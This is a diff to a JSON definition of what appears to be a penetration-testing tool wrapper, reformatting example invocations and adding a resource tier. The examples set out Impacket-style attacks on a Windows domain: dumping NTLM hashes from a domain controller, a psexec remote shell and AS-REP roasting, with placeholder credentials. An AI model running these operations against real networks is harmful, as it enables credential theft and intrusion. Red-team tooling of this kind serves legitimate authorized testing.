@@ -100,9 +100,42 @@
     "color": "red"
   },
   "examples": [
-    {"description": "Dump secrets from domain controller", "args": {"sub_tool": "secretsdump", "domain": "corp.local", "username": "admin", "password": "Password1", "target": "dc01.corp.local", "flags": "-just-dc-ntlm"}},
-    {"description": "Remote shell via psexec", "args": {"sub_tool": "psexec", "domain": "corp.local", "username": "admin", "password": "Password1", "target": "192.168.1.10", "flags": ""}},
-    {"description": "AS-REP roast users without preauth", "args": {"sub_tool": "GetNPUsers", "domain": "corp.local", "username": "", "password": "", "target": "dc01.corp.local", "flags": "-usersfile users.txt -no-pass -dc-ip dc01.corp.local"}}
+    {
+      "description": "Dump secrets from domain controller",
+      "args": {
+        "sub_tool": "secretsdump",
+        "domain": "corp.local",
+        "username": "admin",
+        "password": "Password1",
+        "target": "dc01.corp.local",
+        "flags": "-just-dc-ntlm"
+      }
+    },
+    {
+      "description": "Remote shell via psexec",
+      "args": {
+        "sub_tool": "psexec",
+        "domain": "corp.local",
+        "username": "admin",
+        "password": "Password1",
+        "target": "192.168.1.10",
+        "flags": ""
+      }
+    },
+    {
+      "description": "AS-REP roast users without preauth",
+      "args": {
+        "sub_tool": "GetNPUsers",
+        "domain": "corp.local",
+        "username": "",
+        "password": "",
+        "target": "dc01.corp.local",
+        "flags": "-usersfile users.txt -no-pass -dc-ip dc01.corp.local"
+      }
+    }
   ],
-  "signature": null
+  "signature": null,
+  "resources": {
+    "tier": "heavy"
+  }
 }
